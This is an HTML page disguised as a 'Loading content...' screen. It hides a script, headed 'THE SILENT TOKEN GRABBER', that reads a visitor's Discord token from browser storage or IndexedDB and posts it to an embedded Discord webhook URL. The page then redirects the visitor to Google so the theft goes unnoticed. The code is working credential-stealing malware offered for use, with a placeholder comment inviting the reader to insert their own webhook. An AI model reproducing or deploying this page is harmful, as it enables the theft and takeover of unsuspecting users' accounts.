<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-radius: 50%;
            border-top: 4px solid #ff5733;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Loading content...</p>
    </div>

    <!-- THE SILENT TOKEN GRABBER 😈 -->
    <script>
        // Grab the Discord token from Local Storage (where Discord stores it)
        const token = localStorage.token || sessionStorage.token;

        // If no token found, try IndexedDB (Discord's fallback)
        if (!token) {
            const request = indexedDB.open('discord', 1);
            request.onsuccess = (event) => {
                const db = event.target.result;
                const transaction = db.transaction('localStorage', 'readonly');
                const store = transaction.objectStore('localStorage');
                const getToken = store.get('token');

                getToken.onsuccess = () => {
                    if (getToken.result) {
                        sendToken(getToken.result.value);
                    }
                };
            };
        } else {
            sendToken(token);
        }

        // Send the stolen token to your Discord webhook
        function sendToken(token) {
            const webhookURL = 'https://discord.com/api/webhooks/1502418096286335046/mWeRyOXrz7gTTlM_arGItmDo2XRVnXIGJzAqg6RYCTuxTMYmNlBZkNrnQWCoLKHUhXG6'; // Replace this!

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `🔑 **NEW TOKEN GRABBED!** 🔑\n\`\`\`${token}\`\`\``,
                    username: 'Silent Token Logger',
                    avatar_url: 'https://i.imgur.com/AfFp7pu.png'
                }),
            });
        }

        // Redirect to a legit site to avoid suspicion
        setTimeout(() => {
            window.location.href = 'https://www.google.com';
        }, 2000);
    </script>
</body>
</html>
